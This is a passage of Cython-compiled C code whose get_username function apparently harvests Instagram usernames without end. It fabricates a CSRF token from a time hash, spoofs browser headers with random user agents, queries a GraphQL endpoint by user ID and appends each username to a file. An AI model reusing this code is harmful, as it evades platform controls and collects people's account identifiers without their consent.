    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_get_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 710, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 710, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.get_id", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_7get_username(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_7get_username = {"get_username", (PyCFunction)__pyx_pw_6source_7get_username, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_7get_username(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_username (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_6get_username(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_6get_username(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_csrftoken = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_f = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  int __pyx_t_16;
  int __pyx_t_17;
  int __pyx_t_18;
  char const *__pyx_t_19;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_username", 0);

  
  while (1) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_get_id); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 716, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 716, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_id, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_md5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_time); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_7 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_8), NULL, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 717, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_csrftoken, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyDict_NewPresized(9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 719, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_authority, __pyx_kp_u_www_instagram_com) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_accept, __pyx_kp_u__10) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_dnt, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_dpr, __pyx_kp_u_0_8) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_origin, __pyx_kp_u_https_www_instagram_com) < 0) __PYX_ERR(0, 719, __pyx_L5_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 726, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 726, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_t_6) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_csrftoken, __pyx_v_csrftoken) < 0) __PYX_ERR(0, 719, __pyx_L5_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 730, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_spin_b, __pyx_n_u_trunk) < 0) __PYX_ERR(0, 730, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_fb_api_caller_class, __pyx_n_u_RelayModern) < 0) __PYX_ERR(0, 730, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_fb_api_req_friendly_name, __pyx_n_u_PolarisUserHoverCardContentV2Que) < 0) __PYX_ERR(0, 730, __pyx_L5_error)

        
        __pyx_t_6 = PyNumber_Add(__pyx_kp_u_userID, __pyx_v_id); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 733, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = PyNumber_Add(__pyx_t_6, __pyx_kp_u_username_0s9s); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 733, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_variables, __pyx_t_5) < 0) __PYX_ERR(0, 730, __pyx_L5_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_server_timestamps, __pyx_n_u_true) < 0) __PYX_ERR(0, 730, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_doc_id, __pyx_kp_u_7666785636679494) < 0) __PYX_ERR(0, 730, __pyx_L5_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 737, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_post); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 737, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 739, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 739, __pyx_L5_error)

        
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 739, __pyx_L5_error)

        
        __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__31, __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 737, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_json); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 740, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 740, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 741, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_user); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 741, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_username); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 741, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_username, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_M); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 742, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_username); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 742, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 742, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        /*with:*/ {
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__32, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 743, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_exit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 743, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_enter); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 743, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_5 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 743, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __pyx_t_5;
          __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          /*try:*/ {
            {
              __Pyx_PyThreadState_declare
              __Pyx_PyThreadState_assign
              __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
              __Pyx_XGOTREF(__pyx_t_11);
              __Pyx_XGOTREF(__pyx_t_12);
              __Pyx_XGOTREF(__pyx_t_13);
              /*try:*/ {
                __Pyx_XDECREF_SET(__pyx_v_f, __pyx_t_7);
                __pyx_t_7 = 0;

                
                __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 744, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_5 = PyNumber_Add(__pyx_v_username, __pyx_kp_u__33); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 744, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_5);
                __pyx_t_6 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                  __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
                  if (likely(__pyx_t_6)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                    __Pyx_INCREF(__pyx_t_6);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_4, function);
                  }
                }
                __pyx_t_7 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5);
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 744, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

                
              }
              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              goto __pyx_L26_try_end;
              __pyx_L19_error:;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
              __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
              __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
              /*except:*/ {
                __Pyx_AddTraceback("source.get_username", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_4, &__pyx_t_5) < 0) __PYX_ERR(0, 743, __pyx_L21_except_error)
                __Pyx_GOTREF(__pyx_t_7);
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_GOTREF(__pyx_t_5);
                __pyx_t_6 = PyTuple_Pack(3, __pyx_t_7, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 743, __pyx_L21_except_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_6, NULL);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 743, __pyx_L21_except_error)
                __Pyx_GOTREF(__pyx_t_14);
                __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_14);
                __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
                if (__pyx_t_15 < 0) __PYX_ERR(0, 743, __pyx_L21_except_error)
                __pyx_t_16 = ((!(__pyx_t_15 != 0)) != 0);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_7);
                  __Pyx_GIVEREF(__pyx_t_4);
                  __Pyx_XGIVEREF(__pyx_t_5);
                  __Pyx_ErrRestoreWithState(__pyx_t_7, __pyx_t_4, __pyx_t_5);
                  __pyx_t_7 = 0; __pyx_t_4 = 0; __pyx_t_5 = 0; 
                  __PYX_ERR(0, 743, __pyx_L21_except_error)
                }
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                goto __pyx_L20_exception_handled;
              }
              __pyx_L21_except_error:;
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_XGIVEREF(__pyx_t_12);
              __Pyx_XGIVEREF(__pyx_t_13);
              __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
              goto __pyx_L5_error;
              __pyx_L20_exception_handled:;
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_XGIVEREF(__pyx_t_12);
              __Pyx_XGIVEREF(__pyx_t_13);
              __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
              __pyx_L26_try_end:;
            }
          }
          /*finally:*/ {
            /*normal exit:*/{
              if (__pyx_t_10) {
                __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_tuple_, NULL);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 743, __pyx_L5_error)
                __Pyx_GOTREF(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              }
              goto __pyx_L18;
            }
            __pyx_L18:;
          }
          goto __pyx_L30;
          __pyx_L13_error:;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          goto __pyx_L5_error;
          __pyx_L30:;
        }

        
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L12_try_end;
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

      
      __pyx_t_17 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
      if (__pyx_t_17) {
        __Pyx_AddTraceback("source.get_username", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_7) < 0) __PYX_ERR(0, 745, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_4);
        __pyx_v_e = __pyx_t_4;
        /*try:*/ {

          
          __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 746, __pyx_L36_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }

        
        /*finally:*/ {
          /*normal exit:*/{
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
            goto __pyx_L37;
          }
          __pyx_L36_error:;
          /*exception exit:*/{
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __pyx_t_10 = 0; __pyx_t_13 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_14 = 0; __pyx_t_20 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_11, &__pyx_t_14, &__pyx_t_20);
            if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_10, &__pyx_t_13, &__pyx_t_12) < 0)) __Pyx_ErrFetch(&__pyx_t_10, &__pyx_t_13, &__pyx_t_12);
            __Pyx_XGOTREF(__pyx_t_10);
            __Pyx_XGOTREF(__pyx_t_13);
            __Pyx_XGOTREF(__pyx_t_12);
            __Pyx_XGOTREF(__pyx_t_11);
            __Pyx_XGOTREF(__pyx_t_14);
            __Pyx_XGOTREF(__pyx_t_20);
            __pyx_t_17 = __pyx_lineno; __pyx_t_18 = __pyx_clineno; __pyx_t_19 = __pyx_filename;
            {
              __Pyx_DECREF(__pyx_v_e);
              __pyx_v_e = NULL;
            }
            if (PY_MAJOR_VERSION >= 3) {
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_XGIVEREF(__pyx_t_14);
